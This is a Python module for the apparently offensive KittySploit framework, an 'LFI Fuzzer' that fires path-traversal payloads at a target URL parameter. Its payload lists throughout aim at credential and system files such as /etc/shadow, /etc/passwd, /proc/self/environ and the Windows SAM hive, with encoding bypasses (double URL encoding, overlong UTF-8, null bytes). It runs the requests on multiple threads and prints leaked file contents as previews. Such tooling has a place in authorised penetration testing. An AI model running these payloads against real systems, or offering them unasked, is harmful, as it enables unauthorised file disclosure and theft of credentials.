#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock as ThreadLock
from urllib.parse import parse_qsl, urlencode, urlparse

class Module(Auxiliary, Http_client):


    __info__ = {
        'name': 'LFI Fuzzer',
        'description': 'Fuzzing module for Local File Inclusion vulnerabilities. Tests various LFI bypass techniques and payloads.',
        'author': 'KittySploit Team',
        'tags': ['web', 'lfi', 'fuzzing', 'scanner'],
        'references': [
            'https://owasp.org/www-community/vulnerabilities/Path_Traversal',
            'https://portswigger.net/web-security/file-path-traversal'
        ]
    }

    target = OptString("", "Target URL with LFI parameter (e.g., http://target.com/page.php?file=)", required=True)
    parameter = OptString("file", "Parameter name to fuzz (e.g., file, page, include)", required=False)
    wordlist = OptString("", "Custom wordlist file path (one path per line, optional)", required=False)
    threads = OptInteger(5, "Number of concurrent workers for payload requests", required=False)
    timeout = OptInteger(10, "Request timeout in seconds", required=False)
    delay = OptInteger(1, "Extra delay between scheduler batches (ms, 0=none)", required=False)
    baseline_diff = OptBool(
        True,
        "Compare probe vs benign baseline to reduce false positives (recommended)",
        required=False,
    )
    benign_value = OptString(
        "index.html",
        "Benign parameter value used for baseline request when baseline_diff is enabled",
        required=False,
    )

    BASE_PAYLOADS = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/issue",
        "/proc/version",
        "/proc/cmdline",
        "/proc/mounts",
        "/proc/net/arp",
        "/proc/self/environ",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/auth.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/vsftpd.log",
        "/var/log/sshd.log",
        "/var/log/mail.log",
        "/var/log/syslog",
        "/etc/passwd%00",
        "/etc/passwd\x00",
        "....//....//....//etc/passwd",
        "....\\\\....\\\\....\\\\etc\\\\passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
    ]

    BYPASS_TECHNIQUES = [
        "",
        "../",
        "..\\",
        "..%2F",
        "..%252F",
        "..%c0%af",
        "..%c1%9c",
        "....//",
        "....\\\\",
        "%2e%2e%2f",
        "%252e%252e%252f",
        "..;/",
        "..%3B/",
    ]

    WINDOWS_FILES = [
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "C:\\Windows\\win.ini",
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\boot.ini",
        "C:\\Windows\\repair\\SAM",
        "C:\\Windows\\System32\\config\\system",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\Windows\\System32\\inetsrv\\MetaBase.xml",
    ]

    LINUX_FILES = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/issue",
        "/etc/motd",
        "/etc/group",
        "/etc/resolv.conf",
        "/etc/network/interfaces",
        "/proc/version",
        "/proc/cmdline",
        "/proc/mounts",
        "/proc/net/arp",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/self/fd/0",
        "/proc/self/fd/1",
        "/proc/self/fd/2",
    ]

    LOG_FILES = [
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/auth.log",
        "/var/log/vsftpd.log",
        "/var/log/sshd.log",
        "/var/log/mail.log",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/secure",
        "/usr/local/apache/logs/access_log",
        "/usr/local/apache/logs/error_log",
    ]

    SUCCESS_INDICATORS = [
        'root:x:0:0',
        'daemon:',
        'bin/bash',
        'Linux version',
        'BOOT_IMAGE',
        'HTTP_USER_AGENT',
        'DOCUMENT_ROOT',
        'SERVER_SOFTWARE',
        'Apache/',
        'nginx/',
        'GET /',
        'POST /',
    ]

    ERROR_INDICATORS = [
        '404 Not Found',
        'File not found',
        'Access Denied',
        'Permission denied',
        'Internal Server Error',
        'Error 500',
    ]

    _print_lock = ThreadLock()

    @staticmethod
    def _opt_val(opt, default=None):
        if opt is None:
            return default
        if hasattr(opt, "value"):
            return opt.value
        return opt

    def _parse_lfi_target(self):
        raw = (self._opt_val(self.target) or "").strip()
        if not raw:
            raise ValueError("Target URL is required")
        if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", raw):
            raw = f"http://{raw}"
        parsed = urlparse(raw)
        host = parsed.hostname or ""
        if not host:
            raise ValueError("Invalid target URL (no host)")
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        ssl = parsed.scheme.lower() == "https"
        base_path = parsed.path or "/"
        if not base_path.startswith("/"):
            base_path = f"/{base_path}"
        params = dict(parse_qsl(parsed.query, keep_blank_values=True))
        return host, port, ssl, base_path, params

    def _apply_http_client_target(self):
        host, port, ssl, base_path, params = self._parse_lfi_target()
        if hasattr(self, "set_option"):
            self.set_option("target", host)
            self.set_option("port", int(port))
            self.set_option("ssl", ssl)
        else:
            self.target = host
            self.port = int(port)
            self.ssl = ssl
        self._lfi_base_path = base_path
        self._lfi_base_params = params
        self._configure_session()

    def _param_name(self) -> str:
        return (self._opt_val(self.parameter) or "file").strip() or "file"

    def _build_request_path(self, payload: str) -> str:
        params = dict(self._lfi_base_params)
        params[self._param_name()] = payload
        query = urlencode(params, doseq=True)
        path = self._lfi_base_path
        return f"{path}?{query}" if query else path

    def _load_wordlist_paths(self) -> list:
        wl = (self._opt_val(self.wordlist) or "").strip()
        if not wl:
            return []
        path = os.path.expanduser(wl)
        if not os.path.isfile(path):
            print_error(f"Wordlist not found: {path}")
            return []
        out = []
        with open(path, "r", encoding="utf-8", errors="replace") as handle:
            for line in handle:
                line = line.strip()
                if line and not line.startswith("#"):
                    out.append(line)
        return out

    def check(self):
        if not self._opt_val(self.target):
            print_error("Target URL is required")
            return False
        print_info(f"Checking target: {self._opt_val(self.target)}")
        try:
            self._apply_http_client_target()
            path = self._lfi_base_path.split("?")[0] or "/"
            response = self.http_request(method="GET", path=path)
            if response:
                print_success(f"Target is reachable (Status: {response.status_code})")
                return True
            print_error("Target is not reachable")
            return False
        except Exception as exc:
            print_error(f"Error checking target: {exc}")
            return False

    def generate_payloads(self):
        payloads = list(self.BASE_PAYLOADS)
        payloads.extend(self._load_wordlist_paths())

        test_files = self.LINUX_FILES + self.LOG_FILES
        for bypass in self.BYPASS_TECHNIQUES:
            for file_path in test_files[:12]:
                if bypass:
                    filename = file_path.split("/")[-1] or file_path.split("\\")[-1]
                    payloads.append(f"{bypass}{filename}")
                else:
                    payloads.append(file_path)

        for file_path in self.LINUX_FILES[:5]:
            encoded = file_path.replace("/", "%252F")
            payloads.append(encoded)
            unicode_encoded = file_path.replace("../", "..%c0%af")
            payloads.append(unicode_encoded)

        for wpath in self.WINDOWS_FILES[:6]:
            payloads.append(wpath)

        seen = set()
        ordered = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                ordered.append(p)
        return ordered

    @staticmethod
    def _body_fingerprint(text: str) -> tuple:
        if not text:
            return 0, ""
        t = re.sub(r"\s+", " ", text.lower())[:8000]
        return len(text), t

    def _baseline_diff_ok(self, baseline_text: str, probe_text: str, indicator: str) -> bool:
        if not self._opt_val(self.baseline_diff, True):
            return True
        bl = (baseline_text or "").lower()
        pl = (probe_text or "").lower()
        ind_l = indicator.lower()
        if ind_l in bl:
            return False
        lb_len, lb_fp = self._body_fingerprint(baseline_text or "")
        pr_len, pr_fp = self._body_fingerprint(probe_text or "")
        if lb_len > 200 and pr_len > 200:
            prefix = min(len(lb_fp), len(pr_fp), 2000)
            if prefix > 0 and lb_fp[:prefix] == pr_fp[:prefix] and abs(pr_len - lb_len) < max(120, int(lb_len * 0.04)):
                return False
        if ind_l not in pl:
            return False
        return True

    def test_payload(self, payload: str, baseline_body: str = ""):
        try:
            path = self._build_request_path(payload)
            response = self.http_request(method="GET", path=path, allow_redirects=True)
            if not response:
                return None
            return self.analyze_response(response, payload, baseline_body)
        except Exception as exc:
            print_debug(f"Error testing payload {payload!r}: {exc}")
            return None

    def analyze_response(self, response, payload: str, baseline_body: str = ""):
        content = response.text if hasattr(response, "text") else str(response.content)
        status_code = response.status_code if hasattr(response, "status_code") else 0

        for indicator in self.SUCCESS_INDICATORS:
            if indicator.lower() in content.lower():
                is_error = any(err.lower() in content.lower() for err in self.ERROR_INDICATORS)
                if is_error or len(content) < 50:
                    continue
                if not self._baseline_diff_ok(baseline_body, content, indicator):
                    continue
                return {
                    "vulnerable": True,
                    "payload": payload,
                    "status_code": status_code,
                    "indicator": indicator,
                    "content_length": len(content),
                    "content_preview": content[:200],
                }

        return {
            "vulnerable": False,
            "payload": payload,
            "status_code": status_code,
            "content_length": len(content),
        }

    def _fetch_baseline_body(self) -> str:
        benign = (self._opt_val(self.benign_value) or "index.html").strip() or "index.html"
        try:
            path = self._build_request_path(benign)
            r = self.http_request(method="GET", path=path, allow_redirects=True)
            if r and hasattr(r, "text"):
                return r.text or ""
        except Exception:
            pass
        return ""

    def run(self):
        self.vulnerable_params = []
        self.successful_payloads = []

        if not self._opt_val(self.target):
            print_error("Target URL is required")
            return False

        self._apply_http_client_target()

        print_status("Starting LFI fuzzing...")
        print_info(f"Target: {self._opt_val(self.target)}")
        print_info(f"Parameter: {self._param_name()}")
        print_info(f"Threads: {self._opt_val(self.threads, 5)}")
        print_info(f"Baseline diff: {self._opt_val(self.baseline_diff, True)}")
        wl = (self._opt_val(self.wordlist) or "").strip()
        if wl:
            print_info(f"Wordlist: {wl}")

        baseline_body = ""
        if self._opt_val(self.baseline_diff, True):
            print_status("Fetching benign baseline response...")
            baseline_body = self._fetch_baseline_body()
            print_info(f"Baseline body length: {len(baseline_body)} bytes")

        payloads = self.generate_payloads()
        print_status(f"Total payloads queued: {len(payloads)}")
        print_info("")

        workers = max(1, int(self._opt_val(self.threads, 5) or 5))
        extra_delay_ms = int(self._opt_val(self.delay, 0) or 0)
        tested = 0
        vulnerable_count = 0

        batch = max(workers * 4, 32)
        idx = 0
        while idx < len(payloads):
            chunk = payloads[idx : idx + batch]
            idx += batch
            with ThreadPoolExecutor(max_workers=workers) as executor:
                futures = {executor.submit(self.test_payload, pl, baseline_body): pl for pl in chunk}
                for fut in as_completed(futures):
                    pl = futures[fut]
                    tested += 1
                    try:
                        result = fut.result()
                    except Exception as exc:
                        with self._print_lock:
                            print_debug(f"[{tested}/{len(payloads)}] {pl[:48]!r} failed: {exc}")
                        continue
                    if tested % 25 == 0 or (result and result.get("vulnerable")):
                        with self._print_lock:
                            print_info(f"[{tested}/{len(payloads)}] last: {pl[:60]!r}...")
                    if result and result.get("vulnerable"):
                        vulnerable_count += 1
                        with self._print_lock:
                            print_success(f"\n[!] VULNERABLE: {pl}")
                            print_info(f"    Status: {result.get('status_code')}")
                            print_info(f"    Indicator: {result.get('indicator')}")
                            print_info(f"    Content length: {result.get('content_length')} bytes")
                            print_info(f"    Preview: {result.get('content_preview', '')[:100]}...")
                            print_info("")
                        self.successful_payloads.append(result)
                        self.vulnerable_params.append(
                            {"parameter": self._param_name(), "payload": pl, "result": result}
                        )
            if extra_delay_ms > 0:
                time.sleep(extra_delay_ms / 1000.0)

        print_info("")
        print_status("=" * 60)
        print_status("Fuzzing completed!")
        print_status(f"Total payloads tested: {tested}")
        print_status(f"Vulnerable payloads found: {vulnerable_count}")
        print_status("=" * 60)

        if self.successful_payloads:
            print_success("\nVulnerable payloads:")
            for i, result in enumerate(self.successful_payloads, 1):
                print_info(f"  {i}. {result.get('payload')}")
                print_info(f"     Indicator: {result.get('indicator')}")
        return True
